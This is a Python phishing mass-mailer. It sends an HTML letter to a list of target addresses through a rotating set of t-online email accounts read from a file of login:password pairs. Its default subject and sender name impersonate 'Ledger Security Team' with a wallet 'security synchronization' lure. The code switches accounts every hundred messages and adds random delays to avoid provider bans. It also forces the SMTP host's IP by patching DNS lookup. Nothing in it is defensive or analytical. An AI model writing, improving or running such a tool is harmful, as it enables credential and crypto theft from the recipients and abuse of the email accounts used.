import smtplib
import time
import random
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import socket

# Force IP for securemail.t-online.de to bypass DNS failure on Render
original_gethostbyname = socket.gethostbyname
socket.gethostbyname = lambda x: "195.50.155.50" if x == "securemail.t-online.de" else original_gethostbyname(x)

# ANSI colors
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# === FIXED CONFIG ===
SMTP_HOST = "securemail.t-online.de"
SMTP_PORT = 465  # SSL – t-online prefers this
BATCH_SIZE = 100  # 100 emails per account

# Load fixed files
def load_file(filename):
    if not os.path.exists(filename):
        print(f"Error: {filename} not found!")
        exit()
    with open(filename, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip()]
    return lines

accounts = load_file('accounts.txt')
letter_html = "\n".join(load_file('letter.html'))
subject = load_file('subject.txt')[0] if load_file('subject.txt') else "Ledger Wallet – Recommended Security Synchronization"
sender_name = load_file('sender_names.txt')[0] if load_file('sender_names.txt') else "Ledger Security Team"
targets = load_file('targets.txt')

if not accounts:
    print("No t-online accounts found!")
    exit()

if not targets:
    print("No target emails found!")
    exit()

print(f"Loaded {len(accounts)} t-online accounts")
print(f"Loaded {len(targets)} target emails")
print(f"Subject: {subject}")
print(f"Sender name: {sender_name}\n")

def send_email(account, to_email):
    email_addr, password = account.split(":", 1)
    email_addr = email_addr.strip()
    password = password.strip()

    msg = MIMEMultipart('alternative')
    msg['From'] = f"{sender_name} <{email_addr}>"
    msg['To'] = to_email
    msg['Subject'] = subject

    body = letter_html
    msg.attach(MIMEText(body, 'html'))

    try:
        server = smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, timeout=15)
        server.login(email_addr, password)
        server.sendmail(email_addr, to_email, msg.as_string())
        server.quit()
        print(f"{GREEN}Success [{email_addr} → {to_email}]{RESET}")
        return True
    except Exception as e:
        print(f"{RED}Failed [{email_addr} → {to_email}]: {str(e)[:80]}{RESET}")
        return False

# Main loop – rotate accounts
sent_total = 0
current_account_index = 0

for i, to_email in enumerate(targets, 1):
    account = accounts[current_account_index]
    print(f"Using account: {account.split(':')[0]} | Sending to: {to_email}")

    if send_email(account, to_email):
        sent_total += 1

    # Switch account after BATCH_SIZE
    if i % BATCH_SIZE == 0:
        current_account_index = (current_account_index + 1) % len(accounts)
        print(f"\nSwitched to next account: {accounts[current_account_index].split(':')[0]}\n")

    # Delay to reduce ban risk (t-online is very strict)
    time.sleep(random.uniform(12, 30))  # 12–30 seconds between emails

print(f"\nFinished! Total emails sent: {sent_total}/{len(targets)}")
